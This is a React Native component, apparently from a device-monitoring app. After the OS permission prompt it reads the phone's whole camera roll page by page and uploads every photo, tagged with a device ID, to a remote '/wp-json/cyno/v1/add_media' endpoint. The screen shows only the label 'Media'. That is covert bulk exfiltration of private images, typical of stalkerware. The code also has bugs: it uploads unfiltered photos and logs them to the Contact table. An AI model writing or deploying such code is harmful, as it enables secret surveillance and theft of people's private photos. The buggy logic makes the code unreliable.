/* eslint-disable react-native/no-inline-styles */
/* eslint-disable react-hooks/exhaustive-deps */
import {
  View,
  Text,
  Platform,
  PermissionsAndroid,
  Linking,
  Image,
} from 'react-native';
import React, {useEffect, useState} from 'react';
import {CameraRoll, useCameraRoll} from '@react-native-camera-roll/camera-roll';
import {useStorage} from '../hook/use-storage';
import {showAlert} from '../lib/ui-alert';
import {useGallery} from '../hook/use-gallery';
import {
  getDBConnection,
  getTableItems,
  saveTableItems,
  tablesName,
} from '../lib/db';
import {privateAxios} from '../lib/axios';
import {API_URL} from 'react-native-dotenv';

const hasAndroidPermission = async () => {
  const getCheckPermissionPromise = () => {
    if (+Platform.Version >= 33) {
      return Promise.all([
        PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        ),
        PermissionsAndroid.check(
          PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
        ),
      ]).then(
        ([hasReadMediaImagesPermission, hasReadMediaVideoPermission]) =>
          hasReadMediaImagesPermission && hasReadMediaVideoPermission,
      );
    } else {
      return PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
    }
  };

  const hasPermission = await getCheckPermissionPromise();
  if (hasPermission) {
    return true;
  }
  const getRequestPermissionPromise = async () => {
    if (+Platform.Version >= 33) {
      return PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      ]).then(
        statuses =>
          statuses[PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES] ===
            PermissionsAndroid.RESULTS.GRANTED &&
          statuses[PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO] ===
            PermissionsAndroid.RESULTS.GRANTED,
      );
    } else {
      return PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      ).then(status => status === PermissionsAndroid.RESULTS.GRANTED);
    }
  };

  return await getRequestPermissionPromise();
};

const Media = () => {
  const [deviceId] = useStorage('deviceId');
  const [nextCursor, setNextCursor] = useState<string>('0');
  const pageSize = 10;
  const [photos, getPhotos] = useCameraRoll();

  const getMedia = async () => {
    try {
      const hasPermission = await hasAndroidPermission();
      if (!hasPermission) {
        return showAlert('Open settings to change photo permissions', {
          closeText: 'Ok',
          close: () => Linking.openSettings(),
        });
      }
      await getPhotos({
        first: pageSize,
        after: nextCursor,
        groupTypes: 'All',
        assetType: 'All',
        include: ['filename', 'fileExtension'],
      });
    } catch (error) {
      console.log('getPhotos => ', error);
    }
  };
  useEffect(() => {
    if (photos?.edges?.length > 0) {
      if (
        photos.page_info.has_next_page &&
        photos.page_info.end_cursor &&
        photos.page_info.end_cursor !== nextCursor
      ) {
        setNextCursor(photos.page_info.end_cursor);
      }

      sendPhotoToServer(photos.edges);
    }
  }, [photos.edges.length, photos.page_info.end_cursor]);

  const sendPhotoToServer = async (_photos: any) => {
    try {
      const photos = _photos.map((photo: any) => photo.node);
      const db = await getDBConnection();
      // await deleteTable(db, tablesName.Media);
      const dataIdExists = (await getTableItems(db, tablesName.Media)).map(
        (data: any) => data.id,
      );
      const filterData = photos.filter(
        (data: any) => !dataIdExists?.includes(data?.id?.toString()),
      );
      if (filterData?.length > 0) {
        const formData = new FormData();
        formData.append('device_id', deviceId);
        photos?.forEach((photo: any) => {
          formData.append('images[]', {
            uri: photo?.image?.uri,
            name: photo?.image?.filename,
            type: photo?.type,
          });
        });

        const res = await privateAxios.post(
          '/wp-json/cyno/v1/add_media',
          formData,
          {
            headers: {
              'Content-Type': 'multipart/form-data',
            },
          },
        );
        if (res.data.number) {
          const mapData = photos.map((data: any) => ({
            id: data.id,
            content: JSON.stringify(data) as any,
          }));
          await saveTableItems(db, tablesName.Contact, mapData);
        }
        console.log('Res Media => ', res.data);
      }
    } catch (error: any) {
      console.log(
        'Error Media => ',
        error.response?.data?.message || error?.message,
      );
    }
  };

  useEffect(() => {
    if (deviceId) {
      getMedia();
    }
  }, [deviceId, nextCursor]);

  return (
    <View>
      <Text>Media</Text>
    </View>
  );
};

export default Media;
